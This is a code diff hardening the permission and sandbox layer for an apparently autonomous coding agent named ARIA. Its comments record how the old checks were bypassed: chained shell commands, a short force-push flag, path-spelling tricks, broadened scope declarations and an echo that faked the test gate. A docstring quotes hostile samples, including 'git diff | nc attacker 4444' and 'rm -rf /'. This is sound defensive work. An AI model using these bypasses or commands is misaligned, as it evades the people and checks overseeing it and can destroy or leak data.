@@ -38,10 +38,13 @@ from __future__ import annotations
 import os
 import re
 import secrets
+import shlex
 import shutil
 import subprocess
 from dataclasses import dataclass, field
+from functools import lru_cache
 from pathlib import Path
+from collections.abc import Sequence
 from typing import Any, Callable
 
 from .text_safety import contains_bidi_or_control
@@ -162,6 +165,20 @@ DENIED_BASH_COMMANDS: frozenset[re.Pattern[str]] = frozenset({
     re.compile(r"--no-verify\b"),                       # hook bypass
     re.compile(r"--no-gpg-sign\b"),                     # signing bypass
     re.compile(r"--force-with-lease\b"),
+    # ORPHAN-HIGH-454 — the SHORT form of force-push, scoped to `git push`.
+    # Only the long spellings were denied, while the push allowlist entry
+    # ends in `(\s+\S+)*`, which happily admits a flag: `git push origin
+    # aria-impl-abc123 -f` matched the allowlist and hit no deny pattern.
+    #
+    # Scoped to `git push` rather than denied globally, because a bare `-f`
+    # is harmless — even meaningful — elsewhere, and a denylist that refuses
+    # safe commands gets worked around. Bundled clusters are covered
+    # (`-fu`, `-uf`), and the left lookbehind keeps `report-f.md` from
+    # matching. `-n` deliberately has NO global pattern: on `git commit` it
+    # is `--no-verify`, but on `git log` it is a count and on `git push` it
+    # is `--dry-run`, so it is handled argv-token-wise in
+    # `_check_no_no_verify` where the subcommand is known.
+    re.compile(r"^git\s+push\b.*(?<![\w-])-[a-zA-Z]*f[a-zA-Z]*(?:\s|$)"),
     re.compile(r"\bgit\s+push\s+(?:\+|.+:refs/heads/main\b|origin\s+\+)"),
     re.compile(r"core\.hooksPath"),                     # hooks bypass via config
 })
@@ -176,6 +193,48 @@ FORBIDDEN_GH_API_PATHS: tuple[re.Pattern[str], ...] = (
     re.compile(r"^/repos/[^/]+/[^/]+/actions/"),
     re.compile(r"^/repos/[^/]+/[^/]+/secrets/"),
     re.compile(r"^/orgs/"),
+)
+
+# ORPHAN-CRITICAL-461 — the gh-api guard is an ALLOWLIST now.
+#
+# The five denies above were the whole control, and they missed every route
+# that actually writes main. Measured before this change:
+#
+#     PUT  /repos/o/r/contents/CLAUDE.md    -> allowed   (commits to main)
+#     PATCH /repos/o/r/git/refs/heads/main  -> allowed   (moves the tip)
+#     POST /repos/o/r/merges                -> allowed
+#     POST /repos/o/r/rulesets/1            -> allowed
+#     POST /repos/o/r/hooks                 -> allowed
+#     .../collaborators, .../keys           -> allowed
+#
+# Only `branches/main/protection` was caught. This one is not purely
+# theoretical either: `auto_merge._gh_api_json` consults it on every call.
+#
+# The GitHub REST surface grows, and a denylist over a surface someone else
+# extends is a control that decays without anyone editing it — the same
+# lesson as ORPHAN-HIGH-443 and ORPHAN-CRITICAL-460. Enumerating what ARIA
+# NEEDS is tractable because the answer is small: the only two production
+# call sites are `commits/{sha}/check-runs` and `commits/{sha}/status`, both
+# read-only. The PR/issue read paths below are included because they are the
+# natural next reads for a merge lane and are inert; anything that is not
+# here is refused, and widening it is a deliberate edit with this comment in
+# view.
+#
+# Deny still wins over allow, so `pulls/{n}/merge` stays refused even though
+# `pulls/{n}` is permitted.
+ALLOWED_GH_API_PATHS: tuple[re.Pattern[str], ...] = (
+    re.compile(r"^/repos/[^/]+/[^/]+/commits/[^/]+/check-runs(?:[/?#].*)?$"),
+    re.compile(r"^/repos/[^/]+/[^/]+/commits/[^/]+/status(?:[/?#].*)?$"),
+    # The bare collection: `POST /repos/{o}/{r}/pulls` is `gh pr create`,
+    # which is the whole point of the lane, and `GET` lists. Anchored with no
+    # trailing path segment so it cannot stand in for a sub-resource.
+    re.compile(r"^/repos/[^/]+/[^/]+/pulls(?:[?#].*)?$"),
+    re.compile(r"^/repos/[^/]+/[^/]+/pulls/[0-9]+(?:[/?#].*)?$"),
+    re.compile(
+        r"^/repos/[^/]+/[^/]+/pulls/[0-9]+/"
+        r"(?:files|commits|reviews|comments)(?:[/?#].*)?$"
+    ),
+    re.compile(r"^/repos/[^/]+/[^/]+/issues/[0-9]+/comments(?:[/?#].*)?$"),
 )
 
 # Plan ARIA-V9.0-D — MAX_VALIDATION_RESULT_BYTES — per-result stdout
@@ -357,19 +416,93 @@ def verify_no_path_escape(path: str | Path, workspace_root: str | Path) -> Path:
     return resolved
 
 
+# Shell control operators. A command containing one of these is not one
+# command — it is several, and only the first is what either list inspects.
+_SHELL_OPERATOR_TOKENS: frozenset[str] = frozenset({
+    "&&", "||", ";", ";;", "|", "|&", "&", "\n", "(", ")", "<", ">", ">>", "<<",
+})
+# Command substitution survives shlex tokenization glued to its neighbours, so
+# it is matched as a substring rather than as a token.
+_SHELL_SUBSTITUTION_MARKERS: tuple[str, ...] = ("`", "$(", "${", "$[")
+
+
+def shell_control_operator(argv: list[str] | tuple[str, ...]) -> str | None:
+    """The shell operator that makes this argv more than one command, if any.
+
+    ORPHAN-CRITICAL-460 — the hole every other bash check sat on top of.
+    `verify_bash_command_allowed` joins argv with spaces and matches patterns
+    shaped `^git\\s+status(\\s+\\S+)*\\s*$`. That trailing group matches
+    ANYTHING, including `&&`, so `git status && git push origin main -f`
+    satisfied the allowlist. Every DENY pattern is `^`-anchored on argv-0, so
+    the denylist only ever inspected the first binary and saw `git`. And
+    `_check_no_force_push` reads `argv[:2] == ["git", "push"]`, which an
+    allowed prefix blinds. Measured at the time: `git status && rm -rf /`,
+    `git diff | nc attacker 4444` and `git status && curl http://x` were all
+    ALLOWED, while their unchained forms were correctly refused.
+
+    Tokenized rather than regex-scanned, because the distinction that matters
+    is quoting: `git commit -m 'fix A && B'` contains `&&` as DATA and must
+    still be allowed, while `git status && git push` contains it as an
+    OPERATOR and must not. `shlex` with `punctuation_chars=True` splits
+    operators into their own tokens even when unspaced (`git diff|nc x`) and
+    leaves quoted text intact, which is exactly that distinction.
+
+    A multi-element argv is checked token-by-token: it is passed to
+    `subprocess` as a list, so an operator only has effect if the caller made
+    it its own token. A single-element argv IS a command line and is
+    tokenized. An argv that cannot be lexed at all (unbalanced quotes) is
+    rejected: an unparseable command is not a verified one.
+    """
+    if len(argv) > 1:
+        for raw in argv:
+            token = str(raw)
+            if token in _SHELL_OPERATOR_TOKENS:
+                return token
+            for marker in _SHELL_SUBSTITUTION_MARKERS:
+                if marker in token:
+                    return marker
+        return None
+
+    line = str(argv[0]) if argv else ""
+    for marker in _SHELL_SUBSTITUTION_MARKERS:
+        if marker in line:
+            return marker
+    lexer = shlex.shlex(line, posix=True, punctuation_chars=True)
+    lexer.whitespace_split = True
+    try:
+        tokens = list(lexer)
+    except ValueError:
+        return "unlexable_command"
+    for token in tokens:
+        if token in _SHELL_OPERATOR_TOKENS:
+            return token
+    return None
+
+
 def verify_bash_command_allowed(argv: list[str], *, cwd: str | Path | None = None) -> None:
     """Hard-fail check 8 — Bash allowlist (NOT blocklist).
 
     Joins argv with spaces, tests against:
+      0. shell control operators — any hit → BashDenylistHit
       1. DENIED_BASH_COMMANDS — any hit → BashDenylistHit
       2. ALLOWED_BASH_COMMANDS — at least one MUST match → otherwise
          BashAllowlistMiss
 
-    Order: deny first, then allow. A command matching both is
-    rejected (deny wins).
+    Order: chaining first, then deny, then allow. Chaining has to come first
+    because both lists reason about a SINGLE command, and a chained argv is
+    several — see :func:`shell_control_operator` (ORPHAN-CRITICAL-460).
+    A command matching both deny and allow is rejected (deny wins).
     """
     if not isinstance(argv, (list, tuple)) or not argv:
         raise BashAllowlistMiss(f"argv must be a non-empty list, got {argv!r}")
+    operator = shell_control_operator(argv)
+    if operator is not None:
+        raise BashDenylistHit(
+            f"shell_control_operator_in_command: {operator!r} — argv must be one "
+            f"command. Both the allow and deny lists inspect only the first "
+            f"binary, so a chained command bypasses every one of them. "
+            f"argv0={argv[0]!r}"
+        )
     line = " ".join(str(a) for a in argv)
     for denied in DENIED_BASH_COMMANDS:
         if denied.search(line):
@@ -427,9 +560,15 @@ def _normalize_policy_path(path: str) -> str:
 
 
 def is_gh_api_path_forbidden(path: str) -> bool:
-    """Hard-fail check 8b — gh api path forbidden? Used by callers
-    that do a finer-grained inspection of ``gh api <PATH>`` argv
-    structure rather than relying on the regex allowlist alone."""
+    """Hard-fail check 8b — may ARIA call ``gh api <PATH>``?
+
+    ORPHAN-CRITICAL-461 — an ALLOWLIST as of this change. The five deny
+    patterns are kept and still win, because an explicit refusal carries a
+    clearer signal than "not on the list", but a path that matches no
+    ``ALLOWED_GH_API_PATHS`` entry is now refused rather than permitted.
+    See the comment above that tuple for what the denylist was missing:
+    every route that actually writes ``main``.
+    """
     if not isinstance(path, str):
         return True  # fail closed
     stripped = path.strip()
@@ -438,21 +577,99 @@ def is_gh_api_path_forbidden(path: str) -> bool:
     if any(token in stripped for token in ("{", "}", "$(", "`", ";", "&&", "||")):
         return True
     normalized = stripped if stripped.startswith("/") else "/" + stripped
-    return any(p.search(normalized) for p in FORBIDDEN_GH_API_PATHS)
+    if any(p.search(normalized) for p in FORBIDDEN_GH_API_PATHS):
+        return True
+    return not any(p.match(normalized) for p in ALLOWED_GH_API_PATHS)
 
 
+# ORPHAN-CRITICAL-439 — availability means "verifiably confines", not "is on
+# PATH". Presence and capability come apart in exactly the environment this
+# runs in: inside a container without unprivileged user namespaces, bubblewrap
+# installs cleanly and then fails on every invocation. A PATH-only check would
+# report a backend, `wrap_bash_in_sandbox` would build an argv, and the spawn
+# would die at runtime — or a caller that swallowed the error would proceed
+# unconfined. So each backend is probed once with the same namespace features
+# the real wrapper uses, and the result is cached for the process.
+#
+# The probe argv MUST mirror `wrap_bash_in_sandbox`: same ro-binds (the loader
+# lives under /lib64, so binding only /usr proves nothing), a tmpfs, and
+# --unshare-net. A probe that exercises less than the wrapper can pass while
+# the wrapper fails.
+#
+# ORPHAN-MEDIUM-452 — that requirement used to be a COMMENT, and the two argvs
+# had already drifted: the wrapper emitted `--ro-bind /etc/alternatives` and
+# `--ro-bind /etc/ssl` UNGUARDED while the probe bound neither, so on a runner
+# image lacking either directory the probe reported "available" and every
+# write-capable spawn then died at invocation — ORPHAN-CRITICAL-439's failure
+# mode moved one step later, where it is harder to diagnose. The system paths
+# are now a single tuple that both sides build from, and both sides apply the
+# same existence guard, so the divergence the comment warns about is no longer
+# expressible.
+_SANDBOX_SYSTEM_ROOTS: tuple[str, ...] = (
+    "/usr",
+    "/etc/alternatives",
+    "/etc/ssl",
+    "/lib",
+    "/lib64",
+    "/bin",
+)
+
+
+def _system_ro_binds() -> list[str]:
+    """`--ro-bind` flags for the system paths that exist on THIS host.
+
+    Guarded by existence for the same reason the READONLY_PATHS loop is:
+    bwrap aborts the whole invocation on a bind source it cannot find, so
+    an unconditional bind turns a missing `/etc/ssl` into a total failure
+    of containment rather than a smaller sandbox.
+    """
+    flags: list[str] = []
+    for root in _SANDBOX_SYSTEM_ROOTS:
+        if Path(root).exists():
+            flags.extend(["--ro-bind", root, root])
+    return flags
+
+
+def _bwrap_probe_argv() -> list[str]:
+    return [
+        "bwrap",
+        *_system_ro_binds(),
+        "--proc", "/proc",
+        "--dev", "/dev",
+        "--tmpfs", "/tmp",
+        "--unshare-net",
+        "--", "/bin/true",
+    ]
+
+
+_SANDBOX_PROBE_TIMEOUT_SECONDS = 15
+
+
+def _sandbox_probe_succeeds(argv: Sequence[str]) -> bool:
+    """True when the backend can actually build the namespaces we rely on."""
+    try:
+        completed = subprocess.run(
+            list(argv),
+            capture_output=True,
+            timeout=_SANDBOX_PROBE_TIMEOUT_SECONDS,
+            check=False,
+        )
+    except (OSError, subprocess.SubprocessError):
+        return False
+    return completed.returncode == 0
+
+
+@lru_cache(maxsize=1)
 def _bwrap_available() -> bool:
-    return shutil.which("bwrap") is not None
-
-
-def _firejail_available() -> bool:
-    return shutil.which("firejail") is not None
+    if shutil.which("bwrap") is None:
+        return False
+    return _sandbox_probe_succeeds(_bwrap_probe_argv())
 
 
 class SandboxUnavailable(RuntimeError):
     """No sandbox backend is present, so containment cannot be applied.
 
-    ORPHAN-CRITICAL-342 — raised instead of returning the argv unchanged.
+    ORPHAN-CRITICAL-427 — raised instead of returning the argv unchanged.
     The previous contract handed back a bare list on the no-backend path,
     which is indistinguishable from a sandboxed one, so every caller was
     one forgotten check away from spawning an unconfined process. Callers
@@ -465,11 +682,27 @@ def sandbox_backend() -> str | None:
 
     Exposed so a caller can fail closed BEFORE building a command, rather
     than discovering the absence at spawn time.
+
+    ORPHAN-CRITICAL-451 — bwrap is the ONLY accepted backend. firejail was
+    accepted here until its branch was read: it emitted
+    ``firejail --quiet --private-tmp --whitelist=<workspace>`` and applied
+    **none** of the eighteen READONLY_PATHS, while this function's caller
+    treats a non-None return as proof that containment is in force and
+    PLAN.md makes exactly that the S0 exit criterion. Choosing firejail —
+    which the operator-facing refusal message actively suggested — therefore
+    satisfied the criterion with the kernel fully writable. A backend that
+    clears the gate without enforcing the property the gate exists for is
+    strictly worse than no backend, because "spawn refused" is honest and a
+    false green is not.
+
+    firejail could be made to work (it has ``--read-only``), and that is a
+    reasonable thing to add later — but only alongside a probe that
+    demonstrates the confinement, the way ``_bwrap_probe_argv`` does. It is
+    not added here because it cannot be verified in this environment, and
+    shipping an unverified security control is the defect being closed.
     """
     if _bwrap_available():
         return "bwrap"
-    if _firejail_available():
-        return "firejail"
     return None
 
 
@@ -481,15 +714,15 @@ def wrap_bash_in_sandbox(
 ) -> list[str]:
     """Hard-fail check 8c — Bash sandbox wrapper.
 
-    Returns the argv prefixed with bwrap / firejail flags pinning:
+    Returns the argv prefixed with bwrap flags pinning:
       * Workspace mounted writable
       * READONLY_PATHS mounted ro-bind
       * ``--unshare-net`` (no network egress) unless allow_network=True
       * ``/tmp`` mounted as tmpfs
       * No /root, /home, /etc/secrets bind
 
-    ORPHAN-CRITICAL-342 — raises :class:`SandboxUnavailable` when neither
-    bwrap nor firejail is present. It used to return ``argv`` unchanged
+    ORPHAN-CRITICAL-427 — raises :class:`SandboxUnavailable` when no
+    usable backend is present. It used to return ``argv`` unchanged
     with a comment saying the caller "should record a governance event",
     which made the unconfined path the quiet default: the function had no
     kernel caller at all, so containment existed only as prose in the
@@ -504,14 +737,11 @@ def wrap_bash_in_sandbox(
     """
     workspace = Path(workspace_root).resolve()
     if _bwrap_available():
+        # The system ro-binds come from the same helper the probe uses, so
+        # the two argvs cannot drift (ORPHAN-MEDIUM-452).
         wrap = [
             "bwrap",
-            "--ro-bind", "/usr", "/usr",
-            "--ro-bind", "/etc/alternatives", "/etc/alternatives",
-            "--ro-bind", "/etc/ssl", "/etc/ssl",
-            "--ro-bind", "/lib", "/lib",
-            "--ro-bind", "/lib64", "/lib64",
-            "--ro-bind", "/bin", "/bin",
+            *_system_ro_binds(),
             "--proc", "/proc",
             "--dev", "/dev",
             "--tmpfs", "/tmp",
@@ -528,41 +758,100 @@ def wrap_bash_in_sandbox(
             wrap.append("--unshare-net")
         wrap.append("--")
         return wrap + list(argv)
-    if _firejail_available():
-        wrap = ["firejail", "--quiet", "--private-tmp", f"--whitelist={workspace}"]
-        if not allow_network:
-            wrap.append("--net=none")
-        return wrap + list(argv)
     raise SandboxUnavailable(
-        "sandbox_backend_unavailable: neither bwrap nor firejail is on PATH, "
-        "so READONLY_PATHS cannot be enforced at the syscall level"
+        "sandbox_backend_unavailable: bwrap is not usable on this host, so "
+        "READONLY_PATHS cannot be enforced at the syscall level. Note that "
+        "'installed' is not enough — bwrap is probed for the namespaces the "
+        "wrapper actually builds, and a container without unprivileged user "
+        "namespaces will install it cleanly and fail every invocation."
     )
+
+
+class ResourceLimitsUnavailable(RuntimeError):
+    """No usable limiter, so memory/CPU/task/wall-clock caps cannot apply.
+
+    ORPHAN-HIGH-470 — raised instead of returning the argv unchanged. The
+    bare-list return was indistinguishable from a limited one, which is the
+    same defect SandboxUnavailable was created to close for containment.
+    """
+
+
+def _systemd_run_probe_argv() -> list[str]:
+    # The probe carries the SAME property set the wrapper applies, because a
+    # host can accept `systemd-run` and reject an individual property; a probe
+    # that omitted them would prove less than it appears to.
+    return [
+        "systemd-run", "--user", "--scope", "--quiet",
+        "--property=MemoryMax=2G",
+        "--property=CPUQuota=200%",
+        "--property=TasksMax=50",
+        "--property=RuntimeMaxSec=15",
+        "/bin/true",
+    ]
+
+
+@lru_cache(maxsize=1)
+def _systemd_run_available() -> bool:
+    """ORPHAN-HIGH-470 — installed is not enough, exactly as for bwrap.
+
+    `shutil.which("systemd-run")` was the entire selection test. On any host
+    without a user session bus — every container this runs in — the binary is
+    present at /usr/bin/systemd-run and every invocation fails with
+    "Failed to connect to bus: No medium found". Because the check passed, the
+    working `timeout` branch below was unreachable, so the wrapper contributed
+    a guaranteed spawn failure where it was supposed to contribute limits.
+    """
+    if shutil.which("systemd-run") is None:
+        return False
+    return _sandbox_probe_succeeds(_systemd_run_probe_argv())
 
 
 def apply_resource_limits(argv: list[str], *, timeout_seconds: int = 120) -> list[str]:
     """Hard-fail check ancillary — per-command resource limits.
 
-    Wraps argv in ``systemd-run --user --scope`` with cgroup limits
-    when available; otherwise prefixes ``timeout <seconds>``.
+    Wraps argv in ``systemd-run --user --scope`` with cgroup limits when that
+    actually works on this host; otherwise prefixes ``timeout <seconds>``.
+    Raises :class:`ResourceLimitsUnavailable` when neither is usable.
 
     Limits:
       * MemoryMax=2G
       * CPUQuota=200% (2 cores worth)
       * TasksMax=50 (fork-bomb mitigation)
-      * Timeout per invocation
+      * RuntimeMaxSec=<timeout_seconds> — wall clock
+
+    ORPHAN-HIGH-470 fixed three defects here:
+
+    1. Selection was presence-based (see :func:`_systemd_run_available`).
+    2. The wall-clock cap was ``TimeoutStopSec``, which bounds how long
+       systemd waits for a unit to die AFTER it has been asked to stop. It
+       places no bound on how long the unit may run, so the one limit the
+       caller passes a value for was the one not being applied.
+       ``RuntimeMaxSec`` is the property that bounds runtime.
+    3. The no-limiter tail returned argv unchanged, spawning unbounded — while
+       the caller's own docstring says a write-capable agent must not be
+       spawned unbounded on the strength of a missing perimeter.
     """
-    if shutil.which("systemd-run") is not None:
+    if _systemd_run_available():
         return [
             "systemd-run",
             "--user", "--scope", "--quiet",
             "--property=MemoryMax=2G",
             "--property=CPUQuota=200%",
             "--property=TasksMax=50",
-            f"--property=TimeoutStopSec={timeout_seconds}",
+            f"--property=RuntimeMaxSec={timeout_seconds}",
         ] + list(argv)
     if shutil.which("timeout") is not None:
+        # Wall clock only — no memory/CPU/task ceiling. Weaker than the cgroup
+        # path and deliberately still accepted: an unbounded-runtime agent is
+        # the failure actually observed, and refusing every container host
+        # would take the whole lane down to gain limits it cannot provide.
         return ["timeout", str(timeout_seconds)] + list(argv)
-    return list(argv)
+    raise ResourceLimitsUnavailable(
+        "resource_limits_unavailable: neither systemd-run (working user "
+        "session bus) nor timeout is usable on this host, so memory, CPU, "
+        "task-count and wall-clock caps cannot be applied; refusing to spawn "
+        "an unbounded agent"
+    )
 
 
 def truncate_validation_result(text: str | bytes, *, max_bytes: int = MAX_VALIDATION_RESULT_BYTES) -> str:
@@ -591,7 +880,7 @@ def truncate_validation_result(text: str | bytes, *, max_bytes: int = MAX_VALIDA
 # 15 HARD_FAIL_CHECKS registry
 # =============================================================================
 
-# ORPHAN-CRITICAL-343 — the perimeter is two gates, not one list.
+# ORPHAN-CRITICAL-428 — the perimeter is two gates, not one list.
 #
 # PRE_PR_OPEN checks bound what the implementer may DO: they inspect the
 # diff, the paths it touched, the commands it ran, the branch it pushed.
@@ -647,7 +936,7 @@ class HardFailResult:
 class HardFailReport:
     """The result of running the WHOLE registry.
 
-    ORPHAN-CRITICAL-343 — constructed only by :func:`run_hard_fail_checks`,
+    ORPHAN-CRITICAL-428 — constructed only by :func:`run_hard_fail_checks`,
     so a caller cannot assemble a passing report by hand. ``passed`` is the
     conjunction over every check, and the failures are carried so a refusal
     names what blocked it.
@@ -685,7 +974,7 @@ _REPORT_TOKEN: object = object()
 class HardFailCheck:
     """A single named hard-fail check, bound to its implementation.
 
-    ORPHAN-CRITICAL-343 — ``check`` is REQUIRED. Pre-fix this dataclass
+    ORPHAN-CRITICAL-428 — ``check`` is REQUIRED. Pre-fix this dataclass
     carried only name, description and closes_findings, and its docstring
     claimed "the registry is iterable by orchestrator pre-PR-open +
     pre-merge gates" while nothing iterated it and none of the 17 names
@@ -806,7 +1095,7 @@ def _check_forbidden_scope_normalized(context: HardFailContext) -> HardFailResul
     return _passed(name)
 
 
-# ORPHAN-CRITICAL-343 phase A — the five mechanical pre-PR-open checks.
+# ORPHAN-CRITICAL-428 phase A — the five mechanical pre-PR-open checks.
 #
 # Each one is deliberately narrow and total: it inspects declared fields
 # of the pending action and returns a verdict without touching the
@@ -840,7 +1129,7 @@ _HOOKS_PATH_KEY = "core.hookspath"
 # unsatisfiable and S0 unexitable. Requiring what does not exist is not
 # strictness, it is a gate that can only ever be bypassed.
 #
-# The absence is tracked as ORPHAN-MEDIUM-351 (owner okan, deadline
+# The absence is tracked as ORPHAN-MEDIUM-436 (owner okan, deadline
 # 2026-09-06) rather than silently dropped, and the registry description
 # is corrected to match what is enforced.
 CANONICAL_VALIDATION_COMMANDS: tuple[str, ...] = (
@@ -855,15 +1144,67 @@ def _normalize_declared_path(raw: str) -> str:
 
     Purely lexical: this runs at envelope-mint time, where the paths are
     a declaration of intent and may not exist on any filesystem yet.
+
+    ORPHAN-HIGH-453 — it must collapse EVERY spelling of a path, not just
+    the leading one. The previous body stripped a leading ``./`` and outer
+    slashes and stopped there, so interior ``//`` and ``/./`` survived and
+    ``aria-kernel//aria_kernel/cli.py`` failed to match the
+    ``aria-kernel/aria_kernel/`` READONLY prefix — a one-character edit
+    walked straight through ``_check_kernel_self_modification_at_mint``.
+    Segment-wise reconstruction is what makes that class of bypass
+    unrepresentable rather than one more special case to remember: split on
+    ``/``, drop empty segments (that is ``//``) and ``.`` segments (that is
+    ``/./``), and rejoin. ``..`` is deliberately PRESERVED — the caller
+    rejects it explicitly, and silently resolving it here would turn a
+    traversal attempt into a clean-looking path.
     """
     text = str(raw).strip().replace("\\", "/")
-    while text.startswith("./"):
-        text = text[2:]
-    return text.strip("/")
+    segments = [seg for seg in text.split("/") if seg not in ("", ".")]
+    return "/".join(segments)
+
+
+_FORCE_PUSH_LONG_FLAGS: frozenset[str] = frozenset({"--force", "--force-with-lease"})
+
+
+def _argv_forces_a_push(argv: list[str]) -> str | None:
+    """The offending token when ``argv`` is a force-push, else ``None``.
+
+    ORPHAN-HIGH-454 — this half did not exist. ``_check_no_force_push``
+    inspected ``push_refspecs`` only, so an action that carried its push as
+    a bash command reached the gate with nothing looking at it, and the
+    allowlist entry for push ends in ``(\\s+\\S+)*`` — which admits a flag.
+    ``git push origin aria-impl-abc123 -f`` was therefore allowed by the
+    allowlist, unmatched by the long-form deny patterns, and unexamined
+    here. Force-push is absolutely forbidden by CLAUDE.md; enforcing it on
+    one of the two ways to express it is not enforcing it.
+
+    Token-wise rather than regex over the joined string, because that is
+    what makes short clusters (``-fu``) and a leading ``+`` refspec
+    decidable without also rejecting a filename that happens to contain
+    ``-f``.
+    """
+    if argv[:2] != ["git", "push"]:
+        return None
+    for token in argv[2:]:
+        lowered = token.lower()
+        if lowered in _FORCE_PUSH_LONG_FLAGS:
+            return token
+        # A short cluster containing `f`: -f, -fu, -uf. Not `--foo`, and
+        # not a bare positional such as a branch name.
+        if lowered.startswith("-") and not lowered.startswith("--") and "f" in lowered[1:]:
+            return token
+        # `+src:dst` is a force push with no flag at all.
+        if token.startswith("+"):
+            return token
+    return None
 
 
 def _check_no_force_push(context: HardFailContext) -> HardFailResult:
     name = "no_force_push"
+    if context.bash_argv:
+        offender = _argv_forces_a_push([str(t) for t in context.bash_argv])
+        if offender is not None:
+            return _failed(name, f"force_flag_in_bash_argv:{offender}")
     if not context.push_refspecs:
         return _passed(name, "no_push_refspec_in_action")
     for raw in context.push_refspecs:
@@ -933,16 +1274,36 @@ def _check_kernel_self_modification_at_mint(
         return _failed(name, "affected_surfaces_absent")
     if not isinstance(declared, (list, tuple)):
         return _failed(name, "affected_surfaces_not_a_sequence")
+    # ORPHAN-CRITICAL-461 — an EMPTY list is not "touches nothing", it is a
+    # declaration that establishes nothing, and it used to pass while an
+    # absent key correctly failed. Same treatment for both.
+    if len(declared) == 0:
+        return _failed(name, "affected_surfaces_empty")
     for raw in declared:
         surface = _normalize_declared_path(raw)
         if not surface:
             return _failed(name, "empty_declared_surface")
         if ".." in surface.split("/"):
             return _failed(name, f"traversal_in_declared_surface:{raw}")
+        # A glob cannot be compared against a prefix without expanding it
+        # against a filesystem that does not exist at mint time, so it is
+        # unclassifiable rather than safe. `aria-kernel/**/*.py` passed.
+        if any(ch in surface for ch in "*?["):
+            return _failed(name, f"glob_in_declared_surface:{raw}")
         for readonly in READONLY_PATHS:
             ro = readonly.rstrip("/")
+            # ORPHAN-CRITICAL-461 — BOTH directions. The check used to ask
+            # only "is the declared surface inside a readonly path", so a
+            # strictly BROADER claim walked straight through: declaring one
+            # file under aria-kernel/aria_kernel/ failed, while declaring
+            # `aria-kernel` — which contains it — passed, and so did
+            # `tools`. A scope claim that CONTAINS a protected path is not
+            # safer than one that names it; it is the same write with a
+            # vaguer envelope.
             if surface == ro or surface.startswith(ro + "/"):
                 return _failed(name, f"readonly_surface_declared:{surface}")
+            if ro.startswith(surface + "/"):
+                return _failed(name, f"declared_surface_contains_readonly:{surface}->{ro}")
     return _passed(name)
 
 
@@ -950,13 +1311,30 @@ def _check_test_gate_canonical_suite(context: HardFailContext) -> HardFailResult
     name = "test_gate_canonical_suite"
     if not context.validation_commands:
         return _failed(name, "validation_commands_absent")
-    declared = " \n".join(
-        " ".join(str(command).split()) for command in context.validation_commands
-    )
-    missing = [
-        required for required in CANONICAL_VALIDATION_COMMANDS
-        if required not in declared
-    ]
+    # ORPHAN-CRITICAL-461 — WHOLE-ENTRY membership, not substring over the
+    # concatenation. The previous body joined every declared command into one
+    # string and asked whether each canonical command appeared ANYWHERE in
+    # it, so a single entry that merely mentions them cleared the gate:
+    #
+    #   validation_commands=("echo 'nx affected --target=test nx affected
+    #                         --target=lint npm run type-check'",)   -> PASSED
+    #
+    # An echo of a comment is not a test run. Each canonical command must be
+    # a declared entry in its own right; leading `npx`/`npm exec` wrappers are
+    # tolerated because they are the same invocation, and a trailing argument
+    # is allowed because narrowing a suite is legitimate while replacing it
+    # with prose is not.
+    entries = [" ".join(str(command).split()) for command in context.validation_commands]
+    missing: list[str] = []
+    for required in CANONICAL_VALIDATION_COMMANDS:
+        if not any(
+            entry == required
+            or entry.startswith(required + " ")
+            or entry.endswith(" " + required)
+            and entry.split(required)[0].strip() in {"npx", "npm exec"}
+            for entry in entries
+        ):
+            missing.append(required)
     if missing:
         return _failed(name, "missing_canonical_commands:" + ",".join(missing))
     return _passed(name)
@@ -993,7 +1371,7 @@ def run_hard_fail_checks(
 ) -> HardFailReport:
     """Run the registry (optionally one gate) and return the only valid report.
 
-    ORPHAN-CRITICAL-343 — the single producer of :class:`HardFailReport`.
+    ORPHAN-CRITICAL-428 — the single producer of :class:`HardFailReport`.
     A check that raises is recorded as a FAILURE rather than propagating,
     so one broken check cannot skip the checks after it, and cannot be
     mistaken for the loop having completed.
@@ -1075,7 +1453,7 @@ HARD_FAIL_CHECKS: tuple[HardFailCheck, ...] = (
             "description before the check had an implementation; neither "
             "target exists in this repository, so requiring them would "
             "make the gate unsatisfiable rather than strict. Tracked as "
-            "ORPHAN-MEDIUM-351, not dropped."
+            "ORPHAN-MEDIUM-436, not dropped."
         ),
         closes_findings=("ai-HIGH-008",),
         check=_check_test_gate_canonical_suite,
@@ -1190,7 +1568,7 @@ __all__ = (
     "MAX_VALIDATION_RESULT_BYTES",
     "IMMUTABLE_AGENT_FILE_HASH_REGISTRY",
     "SECRET_SCAN_PATTERNS",
-    # ORPHAN-CRITICAL-343 phase A — one grammar for an ARIA branch, shared
+    # ORPHAN-CRITICAL-428 phase A — one grammar for an ARIA branch, shared
     # by the argv allowlist and the refspec check; and the canonical
     # validation suite the test gate requires.
     "ARIA_IMPL_BRANCH_FRAGMENT",
@@ -1212,12 +1590,13 @@ __all__ = (
     "SandboxUnavailable",
     "sandbox_backend",
     "wrap_bash_in_sandbox",
+    "ResourceLimitsUnavailable",
     "apply_resource_limits",
     "truncate_validation_result",
     # registry
     "HardFailCheck",
     "HARD_FAIL_CHECKS",
-    # ORPHAN-CRITICAL-343 — the perimeter is two gates; the stage names and
+    # ORPHAN-CRITICAL-428 — the perimeter is two gates; the stage names and
     # the set of valid gates are public contract because callers select a
     # stage and an unknown gate must raise rather than select nothing.
     "GATE_PRE_PR_OPEN",
